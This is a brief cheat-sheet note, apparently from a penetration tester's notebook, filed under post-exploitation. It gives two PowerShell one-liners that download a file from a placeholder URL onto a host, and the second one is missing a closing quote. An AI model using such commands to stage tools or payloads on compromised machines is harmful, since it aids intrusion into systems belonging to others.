---
tags: [PostEx, Powershell]
title: PostEx/Powershell Download File
created: '2020-02-17T02:43:00.999Z'
modified: '2020-02-17T02:55:08.620Z'
---

# PostEx/Powershell Download File
```
powershell -Command '(New-Object System.Net.Webclient).DownloadFile("[url]", "[output]")'
```
or
```
powershell -Command 'Invoke-WebRequest -Uri "[url]" -Outfile "[output]'
```
